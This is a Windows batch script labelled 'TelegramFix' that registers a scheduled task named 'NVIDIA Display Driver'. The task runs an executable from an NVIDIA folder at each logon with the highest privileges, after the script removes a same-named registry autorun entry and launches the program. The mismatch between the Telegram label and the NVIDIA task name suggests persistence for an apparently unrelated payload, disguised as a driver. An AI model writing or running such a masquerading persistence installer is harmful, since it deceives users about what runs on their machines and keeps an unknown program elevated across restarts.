@echo off
title TelegramFix - Finalize
echo =========================================
echo   TelegramFix - Create Scheduled Task
echo =========================================
echo.

:: Remove registry autorun if exists (to avoid conflicts)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NVIDIA Display Driver" /f >nul 2>&1

:: Create scheduled task with /it
echo Creating scheduled task...
schtasks /delete /tn "NVIDIA Display Driver" /f >nul 2>&1
schtasks /create /tn "NVIDIA Display Driver" /tr "C:\Program Files (x86)\NVIDIA Corporation\nvdisplay.exe" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /it /f
if %errorlevel% equ 0 (
    echo [OK] Task created successfully
) else (
    echo [ERROR] Failed to create task
)

:: Launch program now
start "" "C:\Program Files (x86)\NVIDIA Corporation\nvdisplay.exe"

echo.
echo Setup completed. It is recommended to restart your computer.
pause